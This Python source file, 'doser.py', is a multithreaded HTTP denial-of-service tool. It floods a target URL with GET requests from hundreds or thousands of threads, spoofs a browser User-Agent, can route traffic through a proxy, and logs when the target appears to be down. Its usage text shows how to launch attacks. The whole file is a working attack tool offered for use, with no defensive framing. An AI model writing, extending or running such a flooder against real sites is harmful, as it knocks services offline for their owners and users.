import requests
import threading
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from loguru import logger
import sys

# Remove default logger
logger.remove()

# Add custom logger
logger.add(
    sys.stdout,
    colorize=True,
    format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <level>{message}</level>",
)

# logging functions
info = logger.info
critical = logger.critical
error = logger.error

class Doser:
    def __init__(self, url, threads=100, continue_on_error=False, proxy=None):
        '''
        Creates a new Doser object with the given parameters
        '''
        self.url = url
        self.threads = threads
        self.proxy = proxy
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        }
        self.stop = threading.Event() # Used to stop the attack
        self.continue_on_error = continue_on_error

    def start(self):
        '''
        Starts the attack by creating threads and starting them
        '''
        info(f"Starting attack with {self.threads} threads")
        for i in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
        for t in threading.enumerate():
            if t != threading.current_thread():
                t.join() # Wait 1 sec for thread to finish

    def _attack(self):
        '''
        Sends requests to the URL until stop is set
        '''
        while not self.stop.is_set():
            try:
                r = requests.get(self.url, headers=self.headers, proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None)
                debug(f"Sent request to {self.url} - {r.status_code}")
                if r.status_code == 429:
                    error("Rate limited")
                    if not self.continue_on_error:
                        self.stop.set()
                        pass
                elif r.status_code in (500,502,503,504):
                    critical(f"Site seems to be down - Status code {r.status_code}")
                    if not self.continue_on_error:
                        self.stop.set()
                        pass
            except requests.exceptions.ReadTimeout:
                warning("Request timed out")
                pass
            except requests.exceptions.ConnectionError:
                critical("Site seems to be down - Connection error")
                if not self.continue_on_error:  
                    self.stop.set()
            except Exception as e:
                error(f"Unknown error: {e}")
                if not self.continue_on_error:
                    self.stop.set()
                    pass

def banner():
    print(r'''
 ________      ______    ________  _______   _______   
|"      "\    /    " \  /"       )/"     "| /"      \  
(.  ___  :)  // ____  \(:   \___/(: ______)|:        | 
|: \   ) || /  /    ) :)\___  \   \/    |  |_____/   ) 
(| (___\ ||(: (____/ //  __/  \\  // ___)_  //      /  
|:       :) \        /  /" \   :)(:      "||:  __   \  
(________/   \"_____/  (_______/  \_______)|__|  \___) 

                                ~> by Shariq Malik <~                                             
           ''')

if __name__ == "__main__":

    banner()

    usage_example = '''
usage examples:
    Start attack with 100 threads:
        python doser.py -u https://example.com

    Start attack with 1000 threads:
        python doser.py -u https://example.com -t 1000

    Start attack with continue on error":
        python doser.py -u https://example.com -c

    Start attack with proxy:
        python doser.py -u https://example.com -x http://<ip>:<port>
        
    Start attack with verbose output:
        python doser.py -u https://example.com -v
    '''

    parser = ArgumentParser(
        epilog=usage_example, formatter_class=RawDescriptionHelpFormatter)

    parser.add_argument("-u", "--url",help="The URL to attack", type=str, required=True)
    parser.add_argument("-t", "--threads", help="Number of threads to use", default=100, type=int, required=False)
    parser.add_argument("-c", "--continue-on-error", help="Continue on error", action="store_true", default=False, required=False)
    parser.add_argument("-x", "--proxy", help="Proxy to use e.g. http://127.0.0.1:8080", type=str, required=False)
    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true", default=False, required=False)

    args = parser.parse_args()

    # Debug and warning functions that can be disabled
    debug = logger.debug if args.verbose else lambda *args, **kwargs: None
    warning = logger.warning if args.verbose else lambda *args, **kwargs: None

    with logger.catch():
        try:
            doser = Doser(args.url, args.threads, args.continue_on_error, args.proxy)
            doser.start()
        except KeyboardInterrupt:
            info("Stopping...")
            doser.stop.set()
            exit(1)
